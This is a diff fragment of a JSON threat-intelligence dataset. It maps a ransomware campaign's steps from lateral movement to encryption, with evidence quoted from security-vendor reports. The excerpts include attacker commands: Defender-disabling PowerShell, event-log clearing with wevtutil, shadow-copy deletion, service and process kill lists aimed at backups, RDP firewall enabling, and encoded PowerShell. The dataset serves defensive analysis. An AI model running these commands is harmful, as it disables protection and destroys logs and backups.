+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:psexec-registry",
+      "id": "tar_action_151e5d062d81ed00a1a907b2",
+      "label": "Move laterally with PsExec and weaken authentication/RDP registry controls",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 6,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "No exact AnyDesk command is provided.",
+      "evidence": [
+        {
+          "block_index": 50,
+          "excerpt": "To maintain persistent command-and-control (C&C) access, the threat actors relied on AnyDesk , creating a remote access channel resilient to traditional incident response actions. They further expanded their situational awareness by downloading, installing and executing Nmap for…",
+          "id": "tar_evidence_1e0c3ce0ed05cd3228d2a9e5",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:anydesk",
+      "id": "tar_action_38857145d53e05c1b069e8f5",
+      "label": "Establish persistent remote access with AnyDesk",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 7,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The Nmap command is source-observed; the output path indicates a compromised FortiGate administrative context.",
+      "evidence": [
+        {
+          "block_index": 50,
+          "excerpt": "To maintain persistent command-and-control (C&C) access, the threat actors relied on AnyDesk , creating a remote access channel resilient to traditional incident response actions. They further expanded their situational awareness by downloading, installing and executing Nmap for…",
+          "id": "tar_evidence_1e0c3ce0ed05cd3228d2a9e5",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 51,
+          "excerpt": "Downloaded NMAP: C:\\Users\\fortigate\\Downloads\\nmap-7.97-setup.exe",
+          "id": "tar_evidence_e44470adb9290f5de075a140",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 52,
+          "excerpt": "nmap -sV -T4 -O -F -oX C:\\Users\\FORTIG~1\\AppData\\Local\\Temp\\zenmap-7ii30x5l.xml --version-light <IP address>",
+          "id": "tar_evidence_f221943a83ca750ddc464be5",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 53,
+          "excerpt": "Critically, the Nmap output path revealed the compromise of a FortiGate administrative account, with network scans originating from this privileged context. This suggests the threat actors had compromised critical network security infrastructure, potentially granting them extens…",
+          "id": "tar_evidence_01385a4e15a9f6339a76c848",
+          "order": 3,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:nmap",
+      "id": "tar_action_c4722932696af47136f12935",
+      "label": "Download and run Nmap for internal network scanning",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 8,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "possible",
+      "confidence": "low",
+      "date_basis": "unresolved",
+      "description": "The source explicitly says the full scope remains unclear; this node must be visually marked uncertain.",
+      "evidence": [
+        {
+          "block_index": 55,
+          "excerpt": "Additional evidence further indicates the possible use of PuTTY for Secure Shell (SSH)-based lateral movement, though the full scope of this tool's usage remains unclear.",
+          "id": "tar_evidence_824ce2d4d2e1c383eecf0798",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:putty-ssh",
+      "id": "tar_action_b00d4ca6b53f316bfbd0627a",
+      "label": "Possibly use PuTTY for SSH-based lateral movement",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 9,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The source uses arrow notation to show process, command, output file, and decoded expression; preserve it as a process chain, not a directly executable command.",
+      "evidence": [
+        {
+          "block_index": 59,
+          "excerpt": "The attacker also executed encoded PowerShell to identify critical domain infrastructure, with a particular focus on the Primary Domain Controller for potential high-impact operations:",
+          "id": "tar_evidence_bb4979a616c3940afc64e446",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 60,
+          "excerpt": "C:\\Windows\\System32\\cmd.exe → /Q /c powershell.exe -noni -nop -w 1 -enc IAAoAEcAZQB0AC0AQQBEAEQAbwBtAGEAaQBuACkALgBQAEQAQwBFAG0AdQBsAGEAdABvAHIA 1> \\Windows\\Temp\\UDaYsR 2>&1 → (Get-ADDomain).PDCEmulator",
+          "id": "tar_evidence_4f0495617a56d08ce724ce6d",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 61,
+          "excerpt": "C:\\Windows\\System32\\cmd.exe → /Q /c powershell.exe -noni -nop -w 1 -enc IABHAGUAdAAtAEEARABEAG8AbQBhAGkAbgAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAUABEAEMARQBtAHUAbABhAHQAbwByAA 1> \\Windows\\Temp\\IHQBeJ 2>&1 → Get-ADDomain | Select-Object PDCEmulator",
+          "id": "tar_evidence_38b4493e8b32ee7f1132e6c7",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:pdc-discovery",
+      "id": "tar_action_45f0f36ce3fb208c3a2e77db",
+      "label": "Identify the PDC Emulator with encoded PowerShell",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 10,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed_with_limited_detail",
+      "confidence": "medium",
+      "date_basis": "unresolved",
+      "description": "GPO abuse is stated in the report, but the parsed text does not expose the exact modification command or exact edge to deployment.",
+      "evidence": [
+        {
+          "block_index": 14,
+          "excerpt": "The campaign’s attack chain exposed several highly sophisticated and concerning tactics. Notably, the threat actor exploited legitimate drivers for defense evasion, abused Group Policy Objects (GPO) to facilitate domain-wide compromise, and deployed custom malicious tools design…",
+          "id": "tar_evidence_8779f9777847dde73b46570b",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 56,
+          "excerpt": "Group Policy Manipulation",
+          "id": "tar_evidence_f4635dfc9067ce366cd0ec12",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 62,
+          "excerpt": "This level of Active Directory manipulation indicates preparation for domain-wide ransomware deployment or the establishment of persistent backdoor installation through GPO abuse.",
+          "id": "tar_evidence_041d4a2fc0f82c1f0f437475",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:gpo-manipulation",
+      "id": "tar_action_1ca6ee6c1db3ed634df6c89e",
+      "label": "Manipulate Group Policy for domain-wide compromise/deployment",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 11,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "possible",
+      "confidence": "medium",
+      "date_basis": "unresolved",
+      "description": "The source presents this as evidence suggesting possible consolidation and explicitly retains alternative explanations.",
+      "evidence": [
+        {
+          "block_index": 64,
+          "excerpt": "The data staging portion of operation suggests what appears to be a methodical approach to information gathering. We found evidence suggesting possible data consolidation in C:\\ProgramData\\data , with hundreds of files being accessed. The presence of zone identifier streams coul…",
+          "id": "tar_evidence_aea7a076c1aec1e49885cdf2",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 65,
+          "excerpt": "C:\\programdata\\data\\<REDACTED>.pdf:zone.identifier:$data",
+          "id": "tar_evidence_16055fa628cd083f3ecdc4b5",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 66,
+          "excerpt": "[approximately 100 similar files]",
+          "id": "tar_evidence_1fd16628d3a77599bf5c0981",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 72,
+          "excerpt": "Even though the timing and volume of these activities align with typical data staging behaviors observed in ransomware attacks, we present this analysis with moderate confidence pending additional forensic validation.",
+          "id": "tar_evidence_b9827b2c272b9d9ee0908259",
+          "order": 3,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:local-staging",
+      "id": "tar_action_ef050d240690f9c9d338c298",
+      "label": "Stage collected files under C:\\ProgramData\\data",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 12,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "possible",
+      "confidence": "medium",
+      "date_basis": "unresolved",
+      "description": "The source warns that WebDAV activity can be legitimate; no direct exfiltration claim is made.",
+      "evidence": [
+        {
+          "block_index": 67,
+          "excerpt": "We observed several WebDAV connections to several internal resources throughout the compromise period. While these connections could potentially indicate an alternative data collection mechanism or preparation for distributed exfiltration, we would also like to note that WebDAV…",
+          "id": "tar_evidence_718ea0c6506ce73bbc8ead8d",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 68,
+          "excerpt": "C:\\Windows\\system32\\davclnt.dll,DavSetCookie <IP Address> http://\\<REDACTED>//",
+          "id": "tar_evidence_786feabbbc567e2b3654d7c9",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 69,
+          "excerpt": "C:\\Windows\\system32\\davclnt.dll,DavSetCookie <IP Address> http://\\<REDACTED>//share_EXT01",
+          "id": "tar_evidence_40bf8072e7185b9ceafa0089",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 70,
+          "excerpt": "C:\\Windows\\system32\\davclnt.dll,DavSetCookie <IP Address> http://\\<REDACTED>//c$",
+          "id": "tar_evidence_f23dc2b1c4bfd4c28ee3116a",
+          "order": 3,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 71,
+          "excerpt": "[approximately 50 different local networks and shares]",
+          "id": "tar_evidence_4605441eb8c8a485c5eba067",
+          "order": 4,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 72,
+          "excerpt": "Even though the timing and volume of these activities align with typical data staging behaviors observed in ransomware attacks, we present this analysis with moderate confidence pending additional forensic validation.",
+          "id": "tar_evidence_b9827b2c272b9d9ee0908259",
+          "order": 5,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:webdav-collection",
+      "id": "tar_action_02560b9f40d63abfb1e159c6",
+      "label": "Access internal resources through WebDAV during collection",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 13,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "likely",
+      "confidence": "medium",
+      "date_basis": "unresolved",
+      "description": "The source says exfiltration was likely carried out through WinSCP.",
+      "evidence": [
+        {
+          "block_index": 74,
+          "excerpt": "Data exfiltration was likely carried out through WinSCP , a legitimate file transfer tool commonly abused by threat actors for its reliability and encryption capabilities. Our telemetry shows the transfer of sensitive internal documentation:",
+          "id": "tar_evidence_d0f228816a1a98024f0e7381",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 75,
+          "excerpt": "C:\\ProgramData\\data\\INTERNAL\\Summary<REDACTED> → \"C:\\ProgramData\\WinSCP.exe\"",
+          "id": "tar_evidence_67f7e8e8a1daaff787d3d35f",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 76,
+          "excerpt": "The choice of WinSCP suggests the attackers prioritized operational security, using encrypted channels to avoid detection by network monitoring solutions.",
+          "id": "tar_evidence_f1194ea3b3e040b74b62538f",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:winscp-exfil",
+      "id": "tar_action_3e837ea91f1d944296922ef2",
+      "label": "Exfiltrate staged internal documentation with WinSCP",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 14,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The command remains a redacted template and is not execution-ready.",
+      "evidence": [
+        {
+          "block_index": 78,
+          "excerpt": "The ransomware was deployed throughout the domain's NETLOGON share, ensuring widespread distribution across all domain-joined systems. The payload was password-protected, likely to evade automated sandbox analysis:",
+          "id": "tar_evidence_b4d00724fde53c5ad522d11d",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 79,
+          "excerpt": "\\\\<REDACTED>.local\\NETLOGON\\<REDACTED>.exe --password [REDACTED_CREDENTIAL] key>",
+          "id": "tar_evidence_b0c87f2732fc36ca3d8ecf7b",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:netlogon-deploy",
+      "id": "tar_action_7b4c571d4170c495d7b9b750",
+      "label": "Deploy the password-protected ransomware payload through NETLOGON",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 15,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The source explicitly places this prior to encryption.",
+      "evidence": [
+        {
+          "block_index": 80,
+          "excerpt": "Prior to encryption, the built-in Windows Defender was neutralized through PowerShell commands:",
+          "id": "tar_evidence_98ac4a9666fb6ddd4b4db1e5",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 81,
+          "excerpt": "Set-MpPreference -DisableRealtimeMonitoring $true -Force",
+          "id": "tar_evidence_072c1b6ea230638c79a27a05",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 82,
+          "excerpt": "Add-MpPreference -ExclusionProcess \"C:\\Windows\\Temp\\<REDACTED>\"",
+          "id": "tar_evidence_90f296c24df3d5a7d5f4e7fc",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:defender-neutralize",
+      "id": "tar_action_f9bc13d704d445dcf33db5eb",
+      "label": "Disable Defender monitoring and exclude the payload process",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 16,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The source associates this with negotiation and additional extortion access, but exact placement relative to encryption is unclear.",
+      "evidence": [
+        {
+          "block_index": 83,
+          "excerpt": "To ensure persistent access for negotiation and additional extortion activities, the following firewall rules were modified:",
+          "id": "tar_evidence_85c7321c02ad7a912b6f92ba",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 84,
+          "excerpt": "netsh firewall set service type remotedesktop mode enable",
+          "id": "tar_evidence_4463d2456d3bae564df999a9",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:enable-rdp",
+      "id": "tar_action_cd88f0de0df208b2c661fe61",
+      "label": "Enable Remote Desktop through the firewall for persistent access",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 17,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "action",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The report describes eventual successful ransomware deployment and the resulting extension and ransom note.",
+      "evidence": [
+        {
+          "block_index": 85,
+          "excerpt": "Overall, the campaign highlights the threat actors' understanding of enterprise security architectures, demonstrated through adaptive countermeasures specifically tailored to overcome deployed security solutions, systematic data theft for double extortion, and the eventual succe…",
+          "id": "tar_evidence_d7ba2cfe6f5b74eeca60a946",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 87,
+          "excerpt": "The ransomware drops the following ransom note and appends the following extension:",
+          "id": "tar_evidence_3bca7a066c1473e7f7b62d2a",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 88,
+          "excerpt": "README-GENTLEMEN.txt - Ransom note containing victim ID and contact information",
+          "id": "tar_evidence_c395c4ed93b17adb750a73f2",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 89,
+          "excerpt": ".7mtzhh - File extension appended to each encrypted file",
+          "id": "tar_evidence_7b3375d679989155bde8944b",
+          "order": 3,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:encrypt-impact",
+      "id": "tar_action_d26cf75244c8f151e5577a53",
+      "label": "Encrypt domain systems and create the ransom note",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 18,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "malware_behavior",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed_capability",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The very long taskkill line is a behavior template plus process list, not a single validated operator command.",
+      "evidence": [
+        {
+          "block_index": 95,
+          "excerpt": "net stop <service_name> (.*)sql(.*), AcrSch2Svc, VSNAPVSS, MVarmor64, MVarmor, VeeamTransportSvc, VeeamDeploymentService, VeeamNFSSvc, AcronisAgent, QBIDPService, QBDBMgrN, QBCFMonitorService, OracleServiceORCL, MySQL, MSSQL, SAPHostExec, SAPHostControl, SAPD$, SAP$, postgresql,…",
+          "id": "tar_evidence_31817a3b8cb3bc1c1a4f4853",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 96,
+          "excerpt": "Further, the threat systematically terminates processes using the following commands:",
+          "id": "tar_evidence_40d9d0ff1c747fc32e830f7f",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 97,
+          "excerpt": "taskkill /IM <process_name>.exe /F Veeam.EndPoint.Service.exe, mvdesktopservice.exe, VeeamDeploymentSvc.exe, VeeamTransportSvc.exe, VeeamNFSSvc.exe, EnterpriseClient.exe, DellSystemDetect.exe, avscc.exe, avagent.exe, sapstartsrv.exe, saposco.exe, saphostexec.exe, CVODS.exe, cvfw…",
+          "id": "tar_evidence_d791f8181cfa3f407a23eb86",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:terminate-services-processes",
+      "id": "tar_action_2ce167ecc60edfa51324a106",
+      "label": "Ransomware stops services and terminates processes that can impede encryption",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 19,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "malware_behavior",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed_capability",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "These are ransomware-internal commands, not necessarily interactive operator commands.",
+      "evidence": [
+        {
+          "block_index": 105,
+          "excerpt": "Disables Windows Defender real-time monitoring: powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -Force\"",
+          "id": "tar_evidence_934139fde07588b33cd86df7",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 106,
+          "excerpt": "wevtutil cl Security",
+          "id": "tar_evidence_0efc1c5173d66a09bf386791",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 107,
+          "excerpt": "wevtutil cl Application",
+          "id": "tar_evidence_bc546133c899b43e565bccb6",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 108,
+          "excerpt": "wevtutil cl System",
+          "id": "tar_evidence_2a7e921d4d3124635e11bf3f",
+          "order": 3,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:clear-logs",
+      "id": "tar_action_fb2eb2441cd6a479be8f28bd",
+      "label": "Ransomware clears Security, Application, and System logs",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 20,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "malware_behavior",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed_capability",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "These are ransomware-internal commands and remain non-execution-ready.",
+      "evidence": [
+        {
+          "block_index": 109,
+          "excerpt": "Deletes shadow copies:",
+          "id": "tar_evidence_bd8b2b82c358a5828d378fd1",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 110,
+          "excerpt": "wmic shadowcopy delete",
+          "id": "tar_evidence_a714d2cee93c76671b3252ba",
+          "order": 1,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        },
+        {
+          "block_index": 111,
+          "excerpt": "vssadmin delete shadows /all /quiet",
+          "id": "tar_evidence_fef4c010c45788f539a471c7",
+          "order": 2,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:delete-shadows",
+      "id": "tar_action_f8cdccc7828c5d3d13f4776b",
+      "label": "Ransomware deletes shadow copies",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 21,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    },
+    {
+      "action_time_text": null,
+      "action_type": "malware_behavior",
+      "activity_id": "tar_activity_f229437da87e2df1482ac5a4",
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "assertion": "observed_capability",
+      "confidence": "high",
+      "date_basis": "unresolved",
+      "description": "The source explicitly describes this as final cleanup after the encryption routine.",
+      "evidence": [
+        {
+          "block_index": 112,
+          "excerpt": "For final cleanup, the ransomware drops a batch script named after itself (e.g., {filename}.exe.bat ). This script pings the local host for a brief delay, deletes the ransomware binary, and then deletes itself. This ensures comprehensive removal of its artifacts after the encryp…",
+          "id": "tar_evidence_864b3e2396fd4452da75ed53",
+          "order": 0,
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": null,
+      "flow_node_id": "flow-node:tg:trend:self-delete",
+      "id": "tar_action_bbdf34e6a20c99f348645196",
+      "label": "Delete the ransomware binary and cleanup script after encryption",
+      "last_seen": null,
+      "relationship_ids": [],
+      "scope_slug": "trend-august-campaign",
+      "sequence_hint": 22,
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ]
+    }
+  ],
+  "activities": [
+    {
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "date_basis": "explicit_source_date",
+      "date_precision": "day",
+      "description": "Huntress-reported incident affecting a construction company. Defender telemetry shows malicious activity from April 22 and explicit ransomware execution activity on May 15.",
+      "evidence": [
+        {
+          "excerpt": "Microsoft Defender logs illustrated malicious activity being detected as far back as April 22.",
+          "role": "date",
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "excerpt": "The file encryption had also started days earlier before the Huntress agent was installed, on May 15.",
+          "role": "date",
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": "2026-04-22T00:00:00Z",
+      "flow_path": "attack-flows/the-gentlemen/?scope=huntress-may-construction",
+      "id": "tar_activity_4de236cdb5a9f74187d0c14c",
+      "last_seen": "2026-05-15T23:59:59Z",
+      "name": "May construction-company incident",
+      "relationship_ids": [],
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ],
+      "type": "incident"
+    },
+    {
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "date_basis": "explicit_source_date",
+      "date_precision": "day",
+      "description": "Huntress-reported incident affecting a shipping and transportation organization. Visibility begins with an RDP session on April 9 and continues through ransomware redeployment and log clearing on April 10.",
+      "evidence": [
+        {
+          "excerpt": "On April 10, the attacker also cleared the System , Application , and Security Windows Event Logs.",
+          "role": "date",
+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        },
+        {
+          "excerpt": "The first point of visibility we had for the Windows Event Logs started on April 9 and showed the threat actor initiating a Remote Desktop Protocol (RDP) connection using a compromised user’s account.",
+          "role": "date",
